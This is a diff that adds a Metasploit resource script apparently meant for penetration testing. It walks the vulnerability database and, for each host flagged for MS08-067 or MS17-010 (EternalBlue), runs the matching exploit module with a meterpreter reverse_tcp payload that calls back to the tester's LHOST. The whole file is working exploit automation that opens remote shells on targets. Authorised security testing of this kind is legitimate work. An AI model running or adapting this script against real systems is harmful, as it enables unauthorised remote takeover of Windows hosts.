@@ -1,0 +1,157 @@
+<ruby>
+
+#
+# This resource script will attempt to exploit the following vulnerabilities:
+#
+#   * MS08-067
+#   * MS17-010
+#
+# It works best if you can pair it with the smb_checks.rc script.
+#
+# Author:
+# sinn3r
+#
+
+@job_ids = []
+
+def wait_until_jobs_done
+    while true
+        @job_ids.each do |job_id|
+            current_job_ids = framework.jobs.keys.map { |e| e.to_i }
+            sleep 1 if current_job_ids.include?(job_id)
+        end
+
+        return
+    end
+end
+
+def ms08_067_netapi_mod
+    framework.exploits.create('windows/smb/ms08_067_netapi')
+end
+
+def ms17_010_mod
+    framework.exploits.create('windows/smb/ms17_010_eternalblue')
+end
+
+def is_port_open?(port)
+    begin
+        sock = Socket.new(Socket::Constants::AF_INET, Socket::Constants::SOCK_STREAM, 0)
+        sock.bind(Socket.pack_sockaddr_in(port, get_lhost))
+    rescue
+        return false
+    ensure
+        sock.close if sock && sock.kind_of?(Socket)
+    end
+
+    true
+end
+
+def get_x86_meterpreter_port
+    port_range = (4000..65535)
+    port_range.each do |port|
+        return port if is_port_open?(port)
+    end
+
+    raise RuntimeError, 'Unable to find a meterpreter port'
+end
+
+def get_x64_meterpreter_port
+    port_range = (3000..65535)
+    port_range.each do |port|
+        return port if is_port_open?(port)
+    end
+
+    raise RuntimeError, 'Unable to find a meterpreter port'
+end
+
+def get_x86_payload_name
+    'windows/meterpreter/reverse_tcp'
+end
+
+def get_x64_payload_name
+    'windows/x64/meterpreter/reverse_tcp'
+end
+
+def get_lhost
+    framework.datastore['LHOST']
+end
+
+def validate_ms08_067(vuln)
+    mod = ms08_067_netapi_mod
+    mod.datastore['RHOST'] = vuln.host.address
+    mod.datastore['RPORT'] = vuln.service ? vuln.service.port : 445
+    mod.datastore['PAYLOAD'] = get_x86_payload_name
+    mod.datastore['LHOST'] = get_lhost
+    mod.datastore['LPORT'] = get_x86_meterpreter_port
+    print_status("Validating MS08-067 on #{mod.datastore['RHOST']}:#{mod.datastore['RPORT']} with #{mod.datastore['PAYLOAD']} on port #{mod.datastore['LPORT']}")
+    begin
+        mod.exploit_simple({
+            'LocalOutput' => self.output,
+            'RunAsJob' => true,
+            'Payload' => get_x86_payload_name
+        })
+        @job_ids << mod.job_id
+    rescue ::Exception => e
+        print_error(e.message)
+    end
+end
+
+def validate_ms17_010(vuln)
+    mod = ms17_010_mod
+    mod.datastore['RHOST'] = vuln.host.address
+    mod.datastore['RPORT'] = vuln.service ? vuln.service.port : 445
+    mod.datastore['PAYLOAD'] = get_x64_payload_name
+    mod.datastore['LHOST'] = get_lhost
+    mod.datastore['LPORT'] = get_x64_meterpreter_port
+    print_status("Validating MS17-010 on #{mod.datastore['RHOST']}:#{mod.datastore['RPORT']} with #{mod.datastore['PAYLOAD']} on port #{mod.datastore['LPORT']}")
+    begin
+        mod.exploit_simple({
+            'LocalOutput' => self.output,
+            'RunAsJob' => true,
+            'Payload' => get_x64_payload_name
+        })
+        @job_ids << mod.job_id
+    rescue ::Exception => e
+        print_error(e.message)
+    end
+end
+
+def is_smb?(host, serv)
+    return false unless serv.host
+    return false if serv.state != Msf::ServiceState::Open
+    return false if serv.port != 445
+    true
+end
+
+def do_validation
+    framework.db.workspace.vulns.each do |vuln|
+        case vuln.name
+        when /MS17\-010/i
+            validate_ms17_010(vuln)
+        when /MS08\-067/i
+            validate_ms08_067(vuln)
+        end
+    end
+end
+
+def setup
+    run_single("setg verbose true")
+end
+
+def main
+    if framework.datastore['LHOST']
+        print_status('Performing validation...')
+        begin
+            do_validation
+            wait_until_jobs_done
+        rescue RuntimeError => e
+            print_error(e.message)
+            print_error("Unable to do validation")
+        end
+    end
+end
+
+setup
+main
+
+</ruby>
